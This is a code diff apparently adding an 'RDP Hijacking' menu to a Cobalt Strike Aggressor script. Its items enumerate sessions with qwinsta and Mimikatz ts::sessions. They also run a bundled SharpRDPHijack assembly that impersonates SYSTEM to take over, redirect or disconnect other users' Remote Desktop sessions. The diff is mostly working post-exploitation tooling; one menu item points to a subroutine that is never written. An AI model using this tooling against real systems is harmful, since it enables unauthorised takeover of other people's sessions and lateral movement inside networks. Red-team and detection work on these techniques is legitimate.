@@ -5,11 +5,74 @@
              
 #################################################
 
-#   MoveKit
+#   RDP Hijacking T1563
 
 #################################################
 
-#TO BE ADDED
+menu "RDP Hijacking" {
+
+menu "Session Enumeration"{
+
+# qwinsta local
+item "qwinsta (local) - T1563"{
+	local ('$bid');
+		foreach $bid ($1){
+			qwinstaloc($bid);
+		}
+}
+
+
+# qwinsta remote
+item "qwinsta (remote) - T1563"{
+	local ('$bid');
+		foreach $bid ($1){
+			qwinstarem($bid);
+		}
+}
+
+
+# Mimikatz TS::Sessions
+item "MimiKatz RDP Sessions - T1563"{
+	local ('$bid');
+		foreach $bid ($1){
+			mimisess($bid);
+		}
+}
+}
+
+# SharpRDPHijack Impersonate NT AUTHROITY\SYSTEM and Hijack Session
+item "Hijack Session as SYSTEM"{
+	local ('$bid');
+		foreach $bid ($1){
+			rdpsys($bid);
+		}
+}
+		
+# SharpRDPHijack Impersonate NT AUTHROITY\SYSTEM and redirect to console session
+item "Hijack Session as SYSTEM and redirect to console session"{
+	local ('$bid');
+		foreach $bid ($1){
+			rdpsyscon($bid);
+		}
+}
+		
+# SharpRDPHijack Hijack Remote Desktop session with user's password
+item "Hijack Session w/user password"{
+	local ('$bid');
+		foreach $bid ($1){
+			rdppass($bid);
+		}
+}
+		
+# SharpRDPHijack Disconnect Session
+item "Disconnect RDP Session"{
+	local ('$bid');
+		foreach $bid ($1){
+			rdpdisconnect($bid);
+		}
+}
+		
+} #End of Menu
 
 #################################################
 
@@ -51,19 +114,56 @@ item "SharpTask  - T1053"{
 
 #################################################
 
-#   MoveKit
+#   RDP Hijacking
 
 #################################################
 
-#TO BE ADDED
+# qwinsta local
+sub qwinstaloc{
+brun($1, "qwinsta");
+}
 
+# qwinsta local
+sub qwinstarem{ 
+prompt_text("Server Name:", "", lambda({ 
+brun($bids, "qwinsta /server:$1"); 
+}, $bids => $1)); 
+}
+
+# MimiKatz TS::Sessions
+sub mimisess{
+bmimikatz($1, "ts::sessions");
+}
+
+# SharpRDPHijack Impersonate NT AUTHROITY\SYSTEM and Hijack Session
+sub rdpsys{ 
+prompt_text("Please Enter A RDP Session:", "", lambda({ 
+bexecute_assembly($bids, script_resource('/exe/RDPHIJACK.exe'), "--session=$1");
+}, $bids => $1)); 
+}
+
+# SharpRDPHijack Impersonate NT AUTHROITY\SYSTEM and redierct to console session
+sub rdpsyscon{ 
+prompt_text("Please Enter A RDP Session:", "", lambda({ 
+bexecute_assembly($bids, script_resource('/exe/RDPHIJACK.exe'), "--session=$1 --console");
+}, $bids => $1)); 
+}
+
+# SharpRDPHijack Hijack Remote Desktop session with user's password
+
+#NEED TO ADD
+
+# SharpRDPHijack Disconnect Session
+sub rdpdisconnect{ 
+prompt_text("Please Enter A RDP Session:", "", lambda({ 
+bexecute_assembly($bids, script_resource('/exe/RDPHIJACK.exe'), "--session=$1 --disconnect");
+}, $bids => $1)); 
+}
 #################################################
 
 #   LOLBins
 
 #################################################
-
-#Execute
 
 #Execute 
  
